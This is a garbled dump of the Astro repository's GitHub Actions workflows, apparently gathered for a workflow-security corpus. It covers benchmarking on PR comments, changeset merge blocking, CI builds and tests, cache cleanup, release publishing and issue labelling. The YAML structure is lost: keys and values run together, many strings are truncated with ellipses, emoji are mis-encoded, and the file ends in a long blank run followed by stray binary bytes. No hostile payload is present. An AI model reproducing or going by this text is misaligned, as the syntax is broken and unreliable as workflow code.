subject ... -Z]).+$- name: ... R titlename: S ... Request/home/huawei/github-actions-security/.github/workflows/withastro_astro__benchmark.yml${{ secrets.TURBO_TOKEN }}${{ secrets.TURBO_TEAM }}${{ sec ... TEAM }}FORCE_COLORTURBO_T ... OKEN }}benchmark${{ github.repository_owner == 'withastro' && github.event.issue.pull_request && startsWith(github.event.comment.body, '!bench') }}${{ git ... ch') }}PR-BENCH${{ steps.benchmark-pr.outputs.BENCH_RESULT }}${{ ste ... SULT }}MAIN-BENCH${{ steps.benchmark-main.outputs.BENCH_RESULT }}PR-BENC ... SULT }}Check if user has write accessCheck i ...  accesslannonbr/repo-permission-check-action@2bb8c89ba8bf115c4bfab344d6a6f442b24c9a1flannonb ... 24c9a1fpermissionpermission: writename: C ...  accessrefs/pull/${{ github.event.issue.number }}/headSetup PNPMname: Setup PNPMnode-version: 22Build Packagesname: Build PackagesGet bench commandbench-commandbenchcmd=$(echo "$COMMENT" | grep '!bench' | awk -F ' ' '{print $2}')
echo "bench=$benchcmd" >> $GITHUB_OUTPUT
name: G ... commandRun benchmarkbenchmark-prresult=$(pnpm run --silent benchmark ${{ steps.bench-command.outputs.bench }})
processed=$(node ./benchmark/ci-helper.js "$result")
echo "BENCH_RESULT<<BENCHEOF" >> $GITHUB_OUTPUT
echo "### PR Benchmark" >> $GITHUB_OUTPUT
echo "$processed" >> $GITHUB_OUTPUT
echo "BENCHEOF" >> $GITHUB_OUTPUT
name: Run benchmarkpnpm install
benchmark-mainresult=$(pnpm run --silent benchmark ${{ steps.bench-command.outputs.bench }})
processed=$(node ./benchmark/ci-helper.js "$result")
echo "BENCH_RESULT<<BENCHEOF" >> $GITHUB_OUTPUT
echo "### Main Benchmark" >> $GITHUB_OUTPUT
echo "$processed" >> $GITHUB_OUTPUT
echo "BENCHEOF" >> $GITHUB_OUTPUT
- name: ...  accessif: ${{ ... ch') }}output-benchmark[benchmark]Comment PR${{ needs.benchmark.outputs.PR-BENCH }}

${{ needs.benchmark.outputs.MAIN-BENCH }}
name: Comment PR- name: Comment PRbenchmark:/home/huawei/github-actions-security/.github/workflows/withastro_astro__check-merge.ymlCheck mergeabilityCheck if there is already a block on this PRCheck i ... this PRblockedissue_n ... mber }}const { data: reviews } = await github.rest.pulls.listReviews({
  owner: context.repo.owner,
  repo: context.repo.repo,
  pull_number: process.env.issue_number,
});

for (const review of reviews) {
  if (review.user.login === 'github-actions[bot]' && review.state === 'CHANGES_REQUESTED') {
    return 'true'
  }
}
return 'false'
name: C ... this PRsteps.blocked.outputs.result != 'true'steps.b ...  'true'reposit ... name }}Get changed files in the .changeset folderGet cha ...  foldertj-actions/changed-files@ed68ef82c095e0d48ec87eccea555d944a631a4ctj-acti ... a631a4c.changeset/**/*.md
name: G ...  folderCheck if any changesets contain minor or major changesCheck i ... changesALL_CHANGED_FILES${{ steps.changed-files.outputs.all_changed_files }}ALL_CHA ... iles }}echo "Checking for changesets marked as minor or major"
echo "found=false" >> $GITHUB_OUTPUT

regex="[\"']astro[\"']: (minor|major)"
for file in ${ALL_CHANGED_FILES}; do
    if [[ $(cat $file) =~ $regex ]]; then
        version="${BASH_REMATCH[1]}"
        echo "version=$version" >> $GITHUB_OUTPUT
        echo "found=true" >> $GITHUB_OUTPUT
        echo "$file has a $version release tag"
    fi
done
Add labelsteps.check.outputs.found == 'true'github.rest.issues.addLabels({
  issue_number: process.env.issue_number,
  owner: context.repo.owner,
  repo: context.repo.repo,
  labels: ['semver: ${{ steps.check.outputs.version }}']
});
name: Add labelChange PR Statusgithub.rest.pulls.createReview({
  owner: context.repo.owner,
  repo: context.repo.repo,
  pull_number: process.env.issue_number,
  event: 'REQUEST_CHANGES',
  body: 'This PR is blocked because it contains a `${{ steps.check.outputs.version }}` changeset. A reviewer will merge this at the next release if approved.'
});
name: C ...  Status- name: ... this PRname: C ... ability/home/huawei/github-actions-security/.github/workflows/withastro_astro__check.ymlExamples astro checkexamples/**"examples/**".github/workflows/check.yml".githu ... ck.yml"scripts/smoke/check.js"script ... eck.js"packages/astro/src/types/public/**"packag ... lic/**""pnpm-lock.yaml"packages/astro/types.d.ts"packag ... s.d.ts"- "examples/**"ASTRO_TELEMETRY_DISABLEDASTRO_T ... ISABLEDASTRO_T ... D: trueastro checkname: Statuspnpm run test:check-examplespnpm ru ... xamplesname: astro checkname: E ... o check/home/huawei/github-actions-security/.github/workflows/withastro_astro__ci.yml.vscode/**".vscode/**".github/ISSUE_TEMPLATE/**".githu ... ATE/**"- ".vscode/**"${{ github.workflow }}-${{ github.event_name == 'pull_request_target' && github.head_ref || github.ref }}Build: ${{ matrix.os }}"Build: ... .os }}"[22]OS: [ub ... latest]Disable git crlfname: D ... it crlfSetup node@${{ matrix.NODE_VERSION }}Setup n ... SION }}${{ matrix.NODE_VERSION }}${{ mat ... SION }}name: S ... SION }}${{ matrix.os == 'ubuntu-latest' && github.repository_owner == 'withastro' }}${{ mat ... tro' }}- name: ... it crlfname: " ... .os }}"pnpm run build --forcepnpm ru ... --forceLint source codepnpm run lint:ciname: L ... ce codeLint publish codepnpm run publintname: L ... sh codeTest: ${{ matrix.os }} (node@${{ matrix.NODE_VERSION }})"Test:  ... ON }})"os: macos-14- os: macos-14OS: [ubuntu-latest]NODE_VE ... SION }}name: " ... ON }})"Test (E2E): ${{ matrix.os }} (node@${{ matrix.NODE_VERSION }})"Test ( ... ON }})"pnpm run test:e2eTest (Smoke): ${{ matrix.os }} (node@${{ matrix.NODE_VERSION }})Checkout docswithastro/docssmoke/docs${{ (github.ref_name == 'next' || github.base_ref == 'next') && '5.0.0-beta' || 'main' }}${{ (gi ... ain' }}reposit ... ro/docsname: Checkout docspnpm install --no-frozen-lockfileReset lockfile changesReset l ... changesgit reset --hardRemove docs translations except for English and KoreanRemove  ...  Koreanfind smoke/docs/src/content/docs ! -name 'en' ! -name 'ko' -type d -mindepth 1 -maxdepth 1 -exec rm -rf {} +find sm ... rf {} +name: R ...  KoreanCheck if docs changedCheck i ... changeddocs:
  - 'packages/integrations/*/README.md'
  - "packages/astro/src/types/public/**"
  - 'packages/astro/src/core/errors/errors-data.ts'
name: C ... changedBuild autogenerated docs pages from current astro branchBuild a ...  branch${{ steps.changes.outputs.docs == 'true' }}cd smoke/docs && pnpm docgen && pnpm docgen:errorscd smok ... :errorsSOURCE_REPO${{ github.event.pull_request.head.repo.full_name || github.event.repository.full_name }}name: B ...  branchpnpm run test:smokeSKIP_OGPUBLIC_TWO_LANGSKIP_OG: true/home/huawei/github-actions-security/.github/workflows/withastro_astro__cleanup-cache.ymlCleanup cache0 11 * * *"0 11 * * *"cron: "0 11 * * *"- cron: "0 11 * * *"Cleanup caches older than 5 daysCleanup ...  5 daysgithub.event_name == 'schedule'github. ... hedule'MyAlbum/purge-cache@881eb5957687193fa612bf74c0042adc78ea5e54MyAlbum ... 8ea5e54max-age432000max-age: 432000name: C ...  5 daysCleanup on PR closegh extension install actions/gh-actions-cache

REPO=${{ github.repository }}
BRANCH="refs/pull/${{ github.event.pull_request.number }}/merge"

echo "Fetching list of cache key"
cacheKeysForPR=$(gh actions-cache list -R $REPO -B $BRANCH -L 100 | cut -f 1 )

## Setting this to not fail the workflow while deleting cache keys. 
set +e
echo "Deleting caches..."
for cacheKey in $cacheKeysForPR
do
    gh actions-cache delete $cacheKey -R $REPO -B $BRANCH --confirm
done
echo "Done"
name: C ... R closename: Cleanup cache/home/huawei/github-actions-security/.github/workflows/withastro_astro__congrats.ymlCongratsbotcongratscongratsbot${{ github.repository_owner == 'withastro' && github.event.head_commit.message != '[ci] format' }}${{ git ... mat' }}withastro/automation/.github/workflows/congratsbot.yml@mainwithast ... ml@mainEMOJISðŸŽ‰,ðŸŽŠ,ðŸ§‘â€ðŸš€,ðŸ¥³,ðŸ™Œ,ðŸš€,ðŸ‘,<:houston_golden:1068575433647456447>,<:astrocoin:894990669515489301>,<:astro_pride:1130501345326157854>'\u1f389\udf89,\u1f38a\udf8a, ... 57854>'EMOJIS: ... 57854>'DISCORD_WEBHOOK${{ secrets.DISCORD_WEBHOOK_CONGRATS }}${{ sec ... RATS }}DISCORD ... RATS }}name: congratsbotcongrats:name: Congratsbot/home/huawei/github-actions-security/.github/workflows/withastro_astro__continuous_benchmark.ymlContinuous benchmarkpackages/astro/src/**/*.ts'packag ... */*.ts'benchmark/**'benchmark/**'- 'pack ... */*.ts'CODSPEEDcodspeedCodSpeedHQ/action@0010eb0ca6e89b80c88e8edaaa07cfe5f3e6664dCodSpee ... 3e6664d./benchmarkpnpm benchworking ... nchmarkcodspeed:name: C ... nchmark/home/huawei/github-actions-security/.github/workflows/withastro_astro__examples-deploy.ymlRedeploy preview.astro.newRedeplo ... tro.new'examples/**'- 'examples/**'branches: deploySend a POST request to Netlify to rebuild preview.astro.newSend a  ... tro.newcurl -X POST -d {} ${{ env.BUILD_HOOK }}'curl - ... OOK }}'BUILD_HOOK${{ secrets.NETLIFY_PREVIEWS_BUILD_HOOK }}BUILD_H ... HOOK }}name: S ... tro.newdeploy:name: R ... tro.new/home/huawei/github-actions-security/.github/workflows/withastro_astro__format.ymlFormatgithub.repository_owner == 'withastro'github. ... hastro'withastro/automation/.github/workflows/format.yml@main"format"command: "format"if: git ... hastro'name: Format/home/huawei/github-actions-security/.github/workflows/withastro_astro__issue-labeled.ymlgithub.repository == 'withastro/astro'github. ... /astro'remove triagecontains(github.event.label.description, '(priority)') && contains(github.event.issue.labels.*.name, 'needs triage')needs triage"needs triage"name: remove triageneeds reprogithub.event.label.name == 'needs repro'github. ...  repro'Hello @${{ github.event.issue.user.login }}. Please provide a [minimal reproduction](https://stackoverflow.com/help/minimal-reproducible-example) using a GitHub repository or [StackBlitz](https://astro.new/repro). Issues marked with `needs repro` will be closed if they have no activity within 3 days.
name: needs reprowontfixgithub.event.label.name == 'wontfix'github. ... ontfix'create-comment, close-issue"create ... -issue"Hello! 

This is an automated message to let you know that we've triaged this issue and unfortunately, we will be closing it as "not planned".

We sometimes have to close good ideas (even great ones!) because our limited resources simply do not allow us to pursue all possible features and improvements, and when fixing bugs we have to balance the impact of the bug against the effort required for the fix. Before closing this we considered several factors such as the amount of work involved, the severity of the problem, the number of people affected, whether a workaround is available, and the ongoing cost of maintenance.

If you're seeing this message and believe you can contribute to this issue, please consider submitting a PR yourself. Astro encourages [community contributions](https://docs.astro.build/en/contribute/)!

If you have more questions, come and say hi in the [Astro Discord](https://astro.build/chat).
actions ... -issue"name: wontfix- name: ...  triageif: git ... /astro'/home/huawei/github-actions-security/.github/workflows/withastro_astro__issue-needs-repro.ymlClose Issues (needs repro)Close I ...  repro)"needs repro"- name: needs reproname: C ...  repro)/home/huawei/github-actions-security/.github/workflows/withastro_astro__issue-opened.ymlLabel issueslabel_issuesgithub.rest.issues.addLabels({
  issue_number: context.issue.number,
  owner: context.repo.owner,
  repo: context.repo.repo,
  labels: ["needs triage"]
})
label_issues:name: Label issues/home/huawei/github-actions-security/.github/workflows/withastro_astro__label.ymlLabel PRsactions/labeler@v4uses: a ... eler@v4- uses: ... eler@v4name: Label PRs/home/huawei/github-actions-security/.github/workflows/withastro_astro__preview-release.yml${{ github.workflow }}-${{ github.event.number }}group:  ... mber }}${{ github.repository_owner == 'withastro' && github.event.label.name == 'pr preview' }}${{ git ... iew' }}Publish preview releasePublish ... releaseRemove Preview Labelpr preview"pr preview"labels: "pr preview"name: R ... w LabelPublish packagespnpm dlx pkg-pr-new publish --pnpm --compact --no-template 'packages/astro' 'packages/integrations/node' 'packages/integrations/cloudflare' 'packages/integrations/netlify' 'packages/integrations/vercel' 
/home/huawei/github-actions-security/.github/workflows/withastro_astro__release.yml1-legacy"1-legacy"2-legacy"2-legacy"3-legacy"3-legacy"4-legacy"4-legacy"Changelog PR or ReleaseChangel ... Release${{ github.repository_owner == 'withastro' }}${{ git ... tro' }}Create Release Pull Request or PublishCreate  ... Publishchangesets/action@001cd79f0a536e733315164543a727bdf2d70affchanges ... 2d70affpnpm run versionpnpm exec changeset publishpnpm ex ... publish[ci] release"[ci] release"${{ secrets.FREDKBOT_GITHUB_TOKEN }}name: C ... PublishGenerate AnnouncementGenerat ... ncement${{ secrets.DISCORD_WEBHOOK }}DISCORD ... HOOK }}node .github/scripts/announce.mjs '${{ steps.changesets.outputs.publishedPackages }}'node .g ... ges }}'name: G ... ncementSend message on DiscordSend me ... DiscordIlshidur/action-discord@0c4b27844ba47cb1c7bee539c8eead5284ce9fa9Ilshidu ... 4ce9fa9${{ steps.message.outputs.DISCORD_MESSAGE }}"${{ st ... AGE }}"args: " ... AGE }}"name: S ... Discordchangelog:/home/huawei/github-actions-security/.github/workflows/withastro_astro__scripts.ymlScripts- "main"packages/astro/src/runtime/client/**/*"packag ... t/**/*"!packages/astro/src/runtime/client/dev-toolbar/**/*"!packa ... r/**/*"- "pack ... t/**/*"Bundle SizeCheckout Reponame: Checkout RepoCheckout Main into tmpCheckou ... nto tmpref: mainname: C ... nto tmpCheck Bundle Sizeconst { default: script } = await import('${{ github.workspace }}/.github/scripts/bundle-size.mjs')
await script({ github, context })
name: C ... le Size- name: ... ut Reponame: Bundle Sizebundle:name: Scripts/home/huawei/github-actions-security/.github/workflows/withastro_astro__sync-examples.ymlSync examplescheckout-refskip-unchanged-checkcheckout-ref:${{ github.workflow }}-${{ github.event_name == 'pull_request' && github.head_ref || github.ref }}Sync branches${{ inputs.checkout-ref }}${{ inp ... -ref }}fetch-d ... changesDetect changesetsbluwy/detect-changesets-action@41d6432bd7bc24b3539228091f88879a18cee39bbluwy/d ... 8cee39bdetectname: D ... ngesetsGet pre mode of changesetsGet pre ... ngesetspreif [ -f ./.changeset/pre.json ]; then
  pre_value=$(jq -r '.tag' ./.changeset/pre.json)
  echo "value=$pre_value" >> $GITHUB_OUTPUT
fi
name: G ... ngesetsSync stable to latest and examples/* branchesSync st ... ranchessteps.detect.outputs.has-changesets == 'false' && github.ref == 'refs/heads/main' && steps.pre.outputs.value == ''steps.d ... e == ''bluwy/auto-branch-sync-action@a72b09dc60911f56a1e7093a069f24480ca3d2abbluwy/a ... ca3d2abmap/ -> latest
/examples/* -> examples/*
${{ inputs.skip-unchanged-check == true }}${{ inputs.dry-run == true }}map: |name: S ... ranchesSync prerelease to alpha branchSync pr ...  branchsteps.detect.outputs.has-changesets == 'false' && steps.pre.outputs.value == 'alpha'steps.d ... 'alpha'/ -> alphamap: / -> alphaSync prerelease to beta branchsteps.detect.outputs.has-changesets == 'false' && steps.pre.outputs.value == 'beta'steps.d ...  'beta'/ -> betamap: / -> betaSync prerelease to rc branchsteps.detect.outputs.has-changesets == 'false' && steps.pre.outputs.value == 'rc'steps.d ... == 'rc'/ -> rcmap: / -> rcname: Sync branchesname: Sync examples/home/huawei/github-actions-security/.github/workflows/withastro_astro__test-hosts.ymlHosted tests'0 0 * * 0'cron: '0 0 * * 0'- cron: '0 0 * * 0'VERCEL_ORG_ID${{ secrets.VERCEL_TEST_ORG_ID }}${{ sec ... G_ID }}VERCEL_PROJECT_ID${{ secrets.VERCEL_TEST_PROJECT_ID }}VERCEL_TOKENBuild Astropnpm turbo build --filter astro --filter @astrojs/vercelpnpm tu ... /vercelname: Build AstroBuild test project./packages/integrations/vercel/test/hosted/hosted-astro-project./packa ... projectname: B ... projectDeploy to Vercelpnpm dlx vercel --prod --prebuiltpnpm dl ... rebuiltname: D ...  Vercelpnpm run test:e2e:hostspnpm ru ... e:hostsname: Hosted tests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               1 ªU  €CÒò    